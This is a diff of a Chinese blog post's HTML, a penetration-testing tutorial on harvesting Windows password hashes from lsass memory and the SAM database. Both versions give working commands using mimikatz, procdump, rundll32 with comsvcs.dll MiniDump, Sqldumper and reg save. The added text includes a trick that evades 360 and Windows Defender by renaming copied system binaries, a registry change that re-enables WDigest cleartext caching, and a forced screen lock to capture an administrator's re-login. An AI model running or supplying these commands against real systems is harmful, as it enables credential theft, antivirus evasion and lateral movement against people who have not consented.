@@ -66,7 +66,7 @@
      
     <div class="article-meta">
       <a href="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/" class="article-date">
-  <time datetime="2022-03-25T06:36:39.000Z" itemprop="datePublished">2022-03-25</time>
+  <time datetime="2022-03-25T06:36:30.000Z" itemprop="datePublished">2022-03-25</time>
 </a> 
   <div class="article-category">
     <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91/">内网</a>
@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">713</span>
+            <span class="post-count">902</span>
         </span>
     </span>
 
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">3 min</span>
+            <span class="post-count">4 min</span>
         </span>
     </span>
 </div>
@@ -101,8 +101,18 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>在内网渗透中拿到普通域用户/域管 hash，就可以直接pth。</p>
-<h1 id="1-mimikatz"><a href="#1-mimikatz" class="headerlink" title="1. mimikatz"></a>1. mimikatz</h1><p>只需要<code>管理员权限</code></p>
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在winserver2012以后，windows保存的不是明文密码，只会保持密码的hash值</p>
+<p>本地用户hash保存在SAM数据库中，域内用户密码hash保存在NTDS.dit文件中</p>
+<p>常见格式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br></pre></td></tr></table></figure>
+
+
+
+<p>AAD3B435B51404EEAAD3B435B51404EE是<code>LM hash</code>   这个是之前认证使用的，现在已经不使用了</p>
+<p>31D6CFE0D16AE931B73C59D7E0C089C0是<code>NTLM hash</code></p>
+<p>在<code>域环境</code>中，机器认证是利用kerberos协议，在内网渗透中，域环境中拿到普通域用户/域管 hash，可以尝试pth。</p>
+<p>在<code>工作组</code>环境中如果两台机器如果本地administrator账号密码一样也可能可以pth（实验过）。</p>
+<h1 id="1-mimikatz"><a href="#1-mimikatz" class="headerlink" title="1. mimikatz"></a>1. mimikatz</h1><p>需要<code>管理员权限</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt </span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325161740275.png" alt="image-20220325161740275"></p>
@@ -118,14 +128,14 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp   #然后将lsass.dmp下载到本地</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">procdump64.exe -accepteula -ma [lsass.exe的PID] lsass.dmp</span><br><span class="line">(mimikatz.exe &quot;sekurlsa::minidump dump path &quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;)</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325150155475.png" alt="image-20220325150155475"></p>
-<h3 id="rundll32-exe-这个就-够了"><a href="#rundll32-exe-这个就-够了" class="headerlink" title="rundll32.exe  这个就 够了"></a>rundll32.exe  这个就 够了</h3><p>(Windows自带C:\WINDOWS\System32\rundll32.exe)     原理是通过<code>API MiniDumpWriteDump</code>，利用<code>comsvcs.dll</code>导出 函数 minidump 进行dump内存</p>
+<h3 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h3><p>有这个就 够了</p>
+<p>(Windows自带C:\WINDOWS\System32\rundll32.exe)     原理是通过<code>API MiniDumpWriteDump</code>，利用<code>comsvcs.dll</code>导出 函数 minidump 进行dump内存</p>
 <p>条件：<code>开启SeDebugPrivilege权限</code> （管理员cmd下改权限 一般情况是Disabled状态，powershell下默认开启）</p>
 <p> powershell/cmd下运行comsvcs.dll 的MiniDump 来dump</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
 
 <p>但要绕过AMSI</p>
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325172436533-16484821151331.png" alt="image-20220325172436533"></p>
-<p>重要问题：</p>
 <h5 id="如何绕过杀软"><a href="#如何绕过杀软" class="headerlink" title="如何绕过杀软"></a>如何绕过杀软</h5><p>cmd下  执行火绒，360，wdf  都报毒，并且还可能没有权限</p>
 <p>powershell下  火绒不报， 360报， wdf 的amsi直接拦截</p>
 <h5 id="绕360和wdf"><a href="#绕360和wdf" class="headerlink" title="绕360和wdf"></a>绕360和wdf</h5><p>参考下面文章，但是2022.3.30这种方法不能绕了，，<br>(<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/IA42D6hjvk4Bld65Wahuag">https://mp.weixin.qq.com/s/IA42D6hjvk4Bld65Wahuag</a>)</p>
@@ -133,7 +143,7 @@
 
 
 
-<p>2022.3.30后来我又想到了，copy个新的rundll32.exe  命名为1.exe ，直接就绕过了</p>
+<p>2022.3.30后来我又想到了，copy  rundll32.exe  命名为1.exe ，直接就绕过了</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd  C:\WINDOWS\System32</span><br><span class="line"></span><br><span class="line">copy C:\windows\System32\comsvcs.dll bypass360.dll</span><br><span class="line">copy C:\WINDOWS\System32\rundll32.exe 1.exe</span><br><span class="line"></span><br><span class="line">1.exe bypass360.dll, MiniDump pid lsass.dmp full</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220330172101684.png" alt="image-20220330172101684"></p>
@@ -151,26 +161,30 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sqldumper.exe &lt;ProcessID&gt; 0 0x01100    完整转储</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220330155608001.png" alt="image-20220330155608001"></p>
-<h1 id="Out-MiniDump"><a href="#Out-MiniDump" class="headerlink" title="Out-MiniDump"></a>Out-MiniDump</h1><p>Out-MiniDump.ps1 wdf直接杀，环境win10下Import-Module 不能执行，可能win server能用吧</p>
+<h1 id="3-Out-MiniDump"><a href="#3-Out-MiniDump" class="headerlink" title="3. Out-MiniDump"></a>3. Out-MiniDump</h1><p>Out-MiniDump.ps1 wdf直接杀，环境win10下Import-Module 不能执行，可能win server能用吧</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module Out-MiniDump  </span><br><span class="line"></span><br><span class="line">Get-Process lsass | Out-Minidump   </span><br></pre></td></tr></table></figure>
 
 <p>没有成功就不截图了</p>
-<h1 id="3-导出本地SAM-mimikatz"><a href="#3-导出本地SAM-mimikatz" class="headerlink" title="3. 导出本地SAM+mimikatz"></a>3. 导出本地SAM+mimikatz</h1><p>导出本地sam数据库数据，（这个只能获得所有<code>本地用户</code>hash）</p>
+<h1 id="4-导出本地SAM-mimikatz"><a href="#4-导出本地SAM-mimikatz" class="headerlink" title="4. 导出本地SAM+mimikatz"></a>4. 导出本地SAM+mimikatz</h1><p>导出本地sam数据库数据，（这个只能获得所有<code>本地用户</code>hash）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM </span><br></pre></td></tr></table></figure>
 
 <p>mimikatz读取即可</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM exit&quot;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325171109114.png" alt="image-20220325171109114"></p>
+<p>方法还有更多，杀软也多种多样，慢慢学习吧</p>
+<p>参考：</p>
+<p>一些获取Windows明文凭据的方法 | Loong716]：<a target="_blank" rel="noopener" href="https://loong716.top/posts/lsass/">https://loong716.top/posts/lsass/</a></p>
 <h1 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h1><ol>
-<li>winserver2012以后只能抓到用户hash，抓不到明文</li>
+<li>winserver2012以后只能抓到用户hash，抓不到明文，但可以通过修改注册表**<code>开启Wdigest Auth</code>**，</li>
 </ol>
-<p>但可以通过修改注册表**<code>开启Wdigest Auth</code>**，</p>
-<p>然后cmd执行<code>强制锁频</code>（rundll32 user32.dll,LockWorkStation），等待管理员重新登陆在抓</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>
 
+<p>然后cmd执行<code>强制锁屏</code>（rundll32 user32.dll,LockWorkStation），等待管理员重新登陆在抓。</p>
 <ol start="2">
-<li>mimikatz要免杀，有杀软一定要绕，不然会暴露</li>
+<li>hashcat 爆破ntlm hash，有可能拿到明文。</li>
+<li>md5解密ntml hash 比较简单的可以解出</li>
+<li>一些工具要做对应的免杀测试吧。</li>
 </ol>
  
       <!-- reward -->
@@ -236,6 +250,15 @@
 
    
   <nav class="article-nav">
+    
+      <a href="/2022/04/04/Laravel/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Laravel
+          
+        </div>
+      </a>
     
     
       <a href="/2022/03/21/Go/" class="article-nav-link">
